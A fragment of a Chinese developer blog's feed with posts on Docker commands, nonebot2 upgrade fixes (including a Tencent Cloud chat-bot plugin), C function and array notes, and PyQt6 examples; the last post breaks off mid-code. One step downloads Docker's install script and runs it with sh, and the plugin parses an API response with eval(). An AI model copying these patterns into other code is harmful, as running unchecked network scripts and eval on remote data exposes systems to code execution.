<h4 id="检查Docker的底层信息"><a href="#检查Docker的底层信息" class="headerlink" title="检查Docker的底层信息"></a>检查Docker的底层信息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker inspect &lt;id&gt;</span><br></pre></td></tr></table></figure>
<h3 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h3><h4 id="登录、登出仓库"><a href="#登录、登出仓库" class="headerlink" title="登录、登出仓库"></a>登录、登出仓库</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker login</span><br><span class="line">docker logout</span><br></pre></td></tr></table></figure>
<h4 id="推送镜像"><a href="#推送镜像" class="headerlink" title="推送镜像"></a>推送镜像</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker push mapleice&#x2F;ubuntu:18.04</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>近期开发时遇到的一些问题</title>
    <url>/2022/01/26/%E8%BF%91%E6%9C%9F%E5%BC%80%E5%8F%91%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="这几周遇到的问题和解决思路整合"><a href="#这几周遇到的问题和解决思路整合" class="headerlink" title="这几周遇到的问题和解决思路整合"></a>这几周遇到的问题和解决思路整合</h1><p>把nonebot2从alpha版本升级到了beta版本，历经了巨大的更新折磨。再次无限感谢nonebot群里群友准备的<a href="https://github.com/nonebot/discussions/discussions/74">升级改动汇总</a>，还有我们的各位大佬群友的帮助。在本次更新正式结束后，将慢慢总结遇到的问题。</p>
<span id="more"></span>
<h2 id="Q1、pypi的源地址"><a href="#Q1、pypi的源地址" class="headerlink" title="Q1、pypi的源地址"></a>Q1、pypi的源地址</h2><p>临时使用（换源都懂，但是有时候国内源更新的太慢，必须用官方源才行）</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple/    #清华</span><br><span class="line">pip3 install -i http://mirrors.aliyun.com/pypi/simple/       #阿里源</span><br><span class="line">pip3 install -i https://pypi.mirrors.ustc.edu.cn/simple/     #中科大</span><br><span class="line">pip3 install -i http://pypi.douban.com/simple/               #豆瓣</span><br><span class="line">pip3 install -i https://pypi.python.org/simple/              #pypi</span><br></pre></td></tr></table></figure>
<p>永久换源</p>
<p><img src="https://s2.loli.net/2022/01/26/9wJxmHORE3uhM2r.png" alt=""></p>
<h2 id="Q2、枫酱的聊天黑名单功能"><a href="#Q2、枫酱的聊天黑名单功能" class="headerlink" title="Q2、枫酱的聊天黑名单功能"></a>Q2、枫酱的聊天黑名单功能</h2><p>嗯，因为有人不懂规矩，喜欢和枫酱聊一些不合适的内容，所以加了这个功能，开源一下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .blacklistsss <span class="keyword">import</span> blacklist</span><br><span class="line">msg = msg[<span class="number">2</span>:] <span class="comment">#beta版本的特性~</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> blacklist:</span><br><span class="line">    <span class="keyword">if</span> each <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="keyword">await</span> maplechat.finish(<span class="string">&quot;请勿输入以上内容！！！&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>聊天插件并不复杂，也开源一波</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> nonebot <span class="keyword">import</span> on_command</span><br><span class="line"><span class="keyword">from</span> nonebot.rule <span class="keyword">import</span> to_me</span><br><span class="line"><span class="keyword">from</span> nonebot.typing <span class="keyword">import</span> T_State</span><br><span class="line"><span class="keyword">from</span> nonebot.params <span class="keyword">import</span> State</span><br><span class="line"><span class="keyword">from</span> nonebot.adapters <span class="keyword">import</span> Bot, Event</span><br><span class="line"><span class="keyword">from</span> nonebot.permission <span class="keyword">import</span> SUPERUSER</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .blacklistsss <span class="keyword">import</span> blacklist</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tencentcloud.common <span class="keyword">import</span> credential</span><br><span class="line"><span class="keyword">from</span> tencentcloud.common.profile.client_profile <span class="keyword">import</span> ClientProfile</span><br><span class="line"><span class="keyword">from</span> tencentcloud.common.profile.http_profile <span class="keyword">import</span> HttpProfile</span><br><span class="line"><span class="keyword">from</span> tencentcloud.common.exception.tencent_cloud_sdk_exception <span class="keyword">import</span> TencentCloudSDKException</span><br><span class="line"><span class="keyword">from</span> tencentcloud.nlp.v20190408 <span class="keyword">import</span> nlp_client, models</span><br><span class="line"></span><br><span class="line">__plugin_name__ = <span class="string">&#x27;chat&#x27;</span></span><br><span class="line">__plugin_usage__ = <span class="string">&#x27;用法：通过腾讯云的接口与枫酱聊天哦~&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># on_command()为针对命令型事件的响应，即以配置的命令前缀为开头的语句，新版本的on_command返回内容会带有指令本身。</span></span><br><span class="line">maplechat = on_command(<span class="string">&quot;枫酱&quot;</span>,priority=<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 具体响应逻辑部分</span></span><br><span class="line"><span class="meta">@maplechat.handle()</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">handle_chat_receive</span>(<span class="params">bot: Bot, event: Event, state: T_State=State(<span class="params"></span>)</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取去除了命令前缀后的信息，并且用strip()去除前后的空格与换行符</span></span><br><span class="line">    msg = <span class="built_in">str</span>(event.get_message()).strip()</span><br><span class="line">    msg = msg[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> each <span class="keyword">in</span> msg:</span><br><span class="line">            <span class="keyword">await</span> maplechat.finish(<span class="string">&quot;请勿输入以上内容！！！&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cred = credential.Credential(SecretId, SecretKey)</span><br><span class="line">        httpProfile = HttpProfile()</span><br><span class="line">        httpProfile.endpoint = <span class="string">&quot;nlp.tencentcloudapi.com&quot;</span></span><br><span class="line">    </span><br><span class="line">        clientProfile = ClientProfile()</span><br><span class="line">        clientProfile.httpProfile = httpProfile</span><br><span class="line">        client = nlp_client.NlpClient(cred, <span class="string">&quot;ap-guangzhou&quot;</span>, clientProfile)</span><br><span class="line">    </span><br><span class="line">        req = models.ChatBotRequest()</span><br><span class="line">        params = &#123;</span><br><span class="line">        <span class="string">&quot;Query&quot;</span> : msg</span><br><span class="line">        &#125;</span><br><span class="line">        req.from_json_string(json.dumps(params))</span><br><span class="line">    </span><br><span class="line">        resp = client.ChatBot(req)</span><br><span class="line">        reply = <span class="built_in">eval</span>(resp.to_json_string())[<span class="string">&quot;Reply&quot;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> TencentCloudSDKException <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(err)</span><br><span class="line">    <span class="comment"># finish会向信息来源发回作为参数的字符串，并且在执行后结束响应</span></span><br><span class="line">    <span class="comment"># 如果希望发送后继续执行代码，应该将finish改为send</span></span><br><span class="line">    <span class="keyword">await</span> maplechat.finish(reply)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Q3、Docker-desktop寄了"><a href="#Q3、Docker-desktop寄了" class="headerlink" title="Q3、Docker desktop寄了"></a>Q3、Docker desktop寄了</h2><p>出大问题只能说，折腾了很久，很折磨心态。</p>
<p>报错内容：什么堆栈问题，一个字看不懂。</p>
<p><a href="https://blog.csdn.net/LeungSr/article/details/117900614">解决方案</a></p>
<p>下载了一个<code>wsl.msi</code>，无脑下一步安装就行。</p>
<h2 id="Q4、Docker-desktop又寄了"><a href="#Q4、Docker-desktop又寄了" class="headerlink" title="Q4、Docker desktop又寄了"></a>Q4、Docker desktop又寄了</h2><p>报错内容：</p>
<p>System.InvalidOperationException:<br>Failed to set version to docker-desktop: exit code: -1</p>
<p>临时解决方案：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">netsh winsock reset    //以管理员身份进cmd</span><br></pre></td></tr></table></figure>
<p>长期解决方案：</p>
<p><a href="https://blog.csdn.net/guoxingege/article/details/108983329">CSDN1</a></p>
<p><a href="https://blog.csdn.net/MShow006/article/details/103774672">CSDN2</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/151392411">知乎</a></p>
<h2 id="Q5、脚本安装docker"><a href="#Q5、脚本安装docker" class="headerlink" title="Q5、脚本安装docker"></a>Q5、脚本安装docker</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh</span><br><span class="line">sh get-docker.sh --mirror Aliyun</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言学习笔记之函数篇</title>
    <url>/2022/01/13/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%87%BD%E6%95%B0%E7%AF%87/</url>
    <content><![CDATA[<h1 id="函数篇"><a href="#函数篇" class="headerlink" title="函数篇"></a>函数篇</h1><p>本章是函数篇了哦</p>
<span id="more"></span>
<h2 id="初见函数"><a href="#初见函数" class="headerlink" title="初见函数"></a>初见函数</h2><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>求出1-10、20-30、35-45的三个和</p>
<h4 id="非函数代码"><a href="#非函数代码" class="headerlink" title="非函数代码"></a>非函数代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> sum;</span><br><span class="line">	<span class="keyword">for</span> ( i=<span class="number">1</span>,sum=<span class="number">0</span>; i&lt;=<span class="number">10</span>; i++)&#123;</span><br><span class="line">		sum += i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d到%d的和是%d\n&quot;</span>, <span class="number">1</span>, <span class="number">10</span>, sum);</span><br><span class="line">	<span class="keyword">for</span> ( i=<span class="number">20</span>,sum=<span class="number">0</span>; i&lt;=<span class="number">30</span>; i++)&#123;</span><br><span class="line">		sum += i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d到%d的和是%d\n&quot;</span>, <span class="number">20</span>, <span class="number">30</span>, sum);</span><br><span class="line">	<span class="keyword">for</span> ( i=<span class="number">35</span>,sum=<span class="number">0</span>; i&lt;=<span class="number">45</span>; i++)&#123;</span><br><span class="line">		sum += i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d到%d的和是%d\n&quot;</span>, <span class="number">35</span>, <span class="number">45</span>, sum);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注：代码复制是程序质量不良的表现。</p>
<h4 id="函数版代码"><a href="#函数版代码" class="headerlink" title="函数版代码"></a>函数版代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> begin, <span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i=begin; i&lt;=end; i++)&#123;</span><br><span class="line">        sum +=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d到%d的和是%d\n&quot;</span>, begin, end, sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    sum(<span class="number">1</span>,<span class="number">10</span>);</span><br><span class="line">    sum(<span class="number">20</span>,<span class="number">30</span>);</span><br><span class="line">    sum(<span class="number">35</span>,<span class="number">45</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="什么是函数"><a href="#什么是函数" class="headerlink" title="什么是函数"></a>什么是函数</h2><p>函数是一块代码，接受零个或多个参数。然后做一件事情，并返回零个或一个值。</p>
<h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> begin, <span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i=begin; i&lt;=end; i++)&#123;</span><br><span class="line">        sum +=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d到%d的和是%d\n&quot;</span>, begin, end, sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>void sum(int begin, int end)</code>为函数头</p>
<p>第一个<code>&#123;&#125;</code>中的内容称为函数体</p>
<p><code>sum</code>是函数名，<code>int begin, int end</code>为参数表</p>
<p><code>void</code>是返回类型，在此例子中表明函数不返回函数值</p>
<h2 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h2><ul>
<li><p>调用语法：函数名(参数值);</p>
</li>
<li><p>()起到了调用函数的功能</p>
</li>
<li>如果有参数，则需要给出正确的数量和顺序</li>
<li>这些值会被按照顺序依次用来初始化函数中的参数</li>
</ul>
<h2 id="函数返回"><a href="#函数返回" class="headerlink" title="函数返回"></a>函数返回</h2><p>函数知道每一次是哪里调用它，会返回到正确的地方。</p>
<h2 id="从函数中返回值"><a href="#从函数中返回值" class="headerlink" title="从函数中返回值"></a>从函数中返回值</h2><ul>
<li>return <strong>停止</strong>函数的执行，并送回一个值</li>
<li>return;</li>
<li>return 表达式;</li>
</ul>
<h2 id="没有返回值的函数"><a href="#没有返回值的函数" class="headerlink" title="没有返回值的函数"></a>没有返回值的函数</h2><ul>
<li>void 函数名（参数表）</li>
<li>不能使用带值的return（可以没有return）</li>
<li>调用的时候不能做返回值的赋值</li>
<li>如果函数有返回值，则必须使用带值的return</li>
</ul>
<h2 id="原型声明"><a href="#原型声明" class="headerlink" title="原型声明"></a>原型声明</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> begin, <span class="keyword">int</span> end)</span></span>; <span class="comment">//声明</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="comment">//以下内容省略</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>函数头，以“ <strong>;</strong> ”结尾，就构成了函数的原型</li>
<li>函数原型的目的是告诉编译器这个函数长什么样【名称，参数（数量及类型），返回类型】</li>
</ul>
<h2 id="类型不匹配"><a href="#类型不匹配" class="headerlink" title="类型不匹配"></a>类型不匹配</h2><ul>
<li>调用函数时给的值与参数的类型不匹配是C语言传统上最大的漏洞</li>
<li>编译器总是悄悄替你把类型转换好，但是这很可能不是你所期望的。</li>
<li>后续C++、Java会更加严格</li>
</ul>
<h2 id="传值"><a href="#传值" class="headerlink" title="传值"></a>传值</h2><p>每个函数有自己的变量空间，参数也位于这个独立的空间中，和其他函数没有关系。</p>
]]></content>
      <categories>
        <category>基础课程学习</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>pyqt6学习</title>
    <url>/2022/01/11/pyqt6%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="pyqt6学习笔记"><a href="#pyqt6学习笔记" class="headerlink" title="pyqt6学习笔记"></a>pyqt6学习笔记</h1><p>整点可视化的GUI界面。</p>
<span id="more"></span>
<h2 id="日期和时间"><a href="#日期和时间" class="headerlink" title="日期和时间"></a>日期和时间</h2><p>PyQt6 有 <code>currentDate</code>、<code>currentTime</code> 和 <code>currentDateTime</code> 方法获取当前的日期或时间。</p>
<h3 id="本地时间"><a href="#本地时间" class="headerlink" title="本地时间"></a>本地时间</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># file: current_date_time.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PyQt6.QtCore <span class="keyword">import</span> QDate, QTime, QDateTime, Qt</span><br><span class="line"></span><br><span class="line">now = QDate.currentDate()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(now.toString(Qt.DateFormat.ISODate))        <span class="comment">#2022-01-11</span></span><br><span class="line"><span class="built_in">print</span>(now.toString(Qt.DateFormat.RFC2822Date))    <span class="comment">#11 Jan 2022</span></span><br><span class="line"></span><br><span class="line">datetime = QDateTime.currentDateTime()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(datetime.toString())                        <span class="comment">#Tue Jan 11 22:04:52 2022</span></span><br><span class="line"></span><br><span class="line">time = QTime.currentTime()</span><br><span class="line"><span class="built_in">print</span>(time.toString(Qt.DateFormat.ISODate))       <span class="comment">#22:04:52</span></span><br></pre></td></tr></table></figure>
<h3 id="UTC时间"><a href="#UTC时间" class="headerlink" title="UTC时间"></a>UTC时间</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PyQt6.QtCore <span class="keyword">import</span> QDateTime, Qt</span><br><span class="line"></span><br><span class="line">now = QDateTime.currentDateTime()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Local datetime: &#x27;</span>, now.toString(Qt.DateFormat.ISODate))              <span class="comment">#Local datetime:  2022-01-11T22:11:31</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Universal datetime: &#x27;</span>, now.toUTC().toString(Qt.DateFormat.ISODate))  <span class="comment">#Universal datetime:  2022-01-11T14:11:31Z</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;The offset from UTC is: <span class="subst">&#123;now.offsetFromUtc()&#125;</span> seconds&#x27;</span>)             <span class="comment">#The offset from UTC is: 28800 seconds</span></span><br><span class="line"><span class="comment">#本例获取了标准时间和本地时间。</span></span><br></pre></td></tr></table></figure>
<p>剩下的其他功能感觉用处不大。截个图备用</p>
<p><img src="https://s2.loli.net/2022/01/11/NiQtYK5IWgCpvrH.png" alt="image-20220111221613537"></p>
<p>留下链接</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://maicss.gitbook.io/pyqt-chinese-tutoral/pyqt6/datetime#li-shi-zhan-yi">日期和时间</a></p>
<h2 id="第一个程序"><a href="#第一个程序" class="headerlink" title="第一个程序"></a>第一个程序</h2><h3 id="新建一个窗口"><a href="#新建一个窗口" class="headerlink" title="新建一个窗口"></a>新建一个窗口</h3><h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># file: simple.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ZetCode PyQt6 tutorial</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">In this example, we create a simple</span></span><br><span class="line"><span class="string">window in PyQt6.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Author: Jan Bodnar</span></span><br><span class="line"><span class="string">Website: zetcode.com</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt6.QtWidgets <span class="keyword">import</span> QApplication, QWidget</span><br><span class="line"><span class="comment">#基础小组件位于 PyQt6.QtWidgets 模块。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">	<span class="comment">#每个 PyQt6 应用程序都必须创建一个应用程序对象。sys.argv 参数是来自命令行的参数列表。Python 脚本可以从 shell 运行，这是应用启动的一种方式。</span></span><br><span class="line">    w = QWidget()</span><br><span class="line">    <span class="comment">#QWidget 小部件是 PyQt6 中所有用户界面对象的基类。我们为 QWidget 提供了默认构造函数。默认构造函数没有父级。没有父级的小部件称为窗口。</span></span><br><span class="line">    w.resize(<span class="number">250</span>, <span class="number">200</span>)</span><br><span class="line">    <span class="comment">#resize 方法改变了小部件的尺寸，现在它250像素宽，150像素高。</span></span><br><span class="line">    w.move(<span class="number">300</span>, <span class="number">300</span>)</span><br><span class="line">	<span class="comment">#move 方法把小部件移动到屏幕的指定坐标(300, 300)。</span></span><br><span class="line">    w.setWindowTitle(<span class="string">&#x27;Simple&#x27;</span>)</span><br><span class="line">    <span class="comment">#使用 setWindowTitle 给窗口设置标题，标题显示在标题栏</span></span><br><span class="line">    w.show()</span><br><span class="line">	<span class="comment">#show 方法是在屏幕上显示小部件的方法。显示一个部件的步骤是首先在内存里创建，然后在屏幕上显示。</span></span><br><span class="line">    sys.exit(app.<span class="built_in">exec</span>())</span><br><span class="line">    <span class="comment">#最后，我们进入应用程序的主循环。事件处理从这里开始。主循环从窗口系统接收事件并将它们分派给应用程序小部件。 如果我们调用 exit 方法或主小部件被销毁，则主循环结束。sys.exit 方法确保一个干净的退出。环境将被告知应用程序如何结束。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="创建一个气泡提示"><a href="#创建一个气泡提示" class="headerlink" title="创建一个气泡提示"></a>创建一个气泡提示</h3><h4 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># file: tooltip.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ZetCode PyQt6 tutorial</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This example shows a tooltip on</span></span><br><span class="line"><span class="string">a window and a button.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Author: Jan Bodnar</span></span><br><span class="line"><span class="string">Website: zetcode.com</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt6.QtWidgets <span class="keyword">import</span> (QWidget, QToolTip,</span><br><span class="line">    QPushButton, QApplication)</span><br><span class="line"><span class="keyword">from</span> PyQt6.QtGui <span class="keyword">import</span> QFont</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span>(<span class="params">QWidget</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line"></span><br><span class="line">        self.initUI()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initUI</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        QToolTip.setFont(QFont(<span class="string">&#x27;SansSerif&#x27;</span>, <span class="number">10</span>))</span><br><span class="line">		<span class="comment">#这个静态方法给气泡提示框设置了字体，这里使用了10pt 的 SansSerif 字体。</span></span><br><span class="line">        self.setToolTip(<span class="string">&#x27;This is a &lt;b&gt;QWidget&lt;/b&gt; widget&#x27;</span>)</span><br><span class="line">		<span class="comment">#调用 setTooltip 方法创建气泡提示框，可以使用富文本内容。</span></span><br><span class="line">        btn = QPushButton(<span class="string">&#x27;Button&#x27;</span>, self)</span><br><span class="line">        btn.setToolTip(<span class="string">&#x27;This is a &lt;b&gt;QPushButton&lt;/b&gt; widget&#x27;</span>)</span><br><span class="line">        <span class="comment">#在气泡提示框上添加了一个按钮部件。</span></span><br><span class="line">        btn.resize(btn.sizeHint())</span><br><span class="line">        btn.move(<span class="number">50</span>, <span class="number">50</span>)</span><br><span class="line">		<span class="comment">#sizeHint 方法是给按钮一个系统建议的尺寸，然后使用 move 方法移动这个按钮的位置。</span></span><br><span class="line">        self.setGeometry(<span class="number">300</span>, <span class="number">300</span>, <span class="number">300</span>, <span class="number">200</span>)</span><br><span class="line">        self.setWindowTitle(<span class="string">&#x27;Tooltips&#x27;</span>)</span><br><span class="line">        self.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    ex = Example()</span><br><span class="line">    sys.exit(app.<span class="built_in">exec</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h4 id="示例图片"><a href="#示例图片" class="headerlink" title="示例图片"></a>示例图片</h4><p><img src="https://s2.loli.net/2022/02/01/NAGiqnQv5rEKYwO.png" alt="image-20220201234745997"></p>
<p><img src="https://s2.loli.net/2022/02/01/RyvLD1HgWipwIG6.png" alt="image-20220201234817130"></p>
]]></content>
      <categories>
        <category>科创</category>
      </categories>
      <tags>
        <tag>pyqt6</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言学习笔记之数组篇</title>
    <url>/2022/01/09/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E7%BB%84%E7%AF%87/</url>
    <content><![CDATA[<h1 id="数组篇"><a href="#数组篇" class="headerlink" title="数组篇"></a>数组篇</h1><p>循环部分因为有python基础，就快速的过一遍，不作详细记录。直接开始数组篇的学习了哦~</p>
<span id="more"></span>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a><strong>问题</strong></h2><p>如何写一个程序计算用户输入的数字的平均数，并输出所有大于平均数的数？</p>
<h2 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line">	<span class="keyword">double</span> sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//定义数组</span></span><br><span class="line">    <span class="keyword">int</span> number[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">	<span class="keyword">while</span>( x!= <span class="number">-1</span> )&#123;</span><br><span class="line">		<span class="comment">//对数组中的元素赋值</span></span><br><span class="line">        number[cnt] = x;</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span> i;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, cnt);</span><br><span class="line">			<span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;=cnt; i++ )&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, number[i]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">				</span><br><span class="line">		sum += x;</span><br><span class="line">		cnt ++;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (cnt &gt; <span class="number">0</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>, sum/cnt);</span><br><span class="line">		<span class="keyword">int</span> i ;</span><br><span class="line">		<span class="comment">//遍历数组</span></span><br><span class="line">        <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;cnt;i++)&#123;</span><br><span class="line">			<span 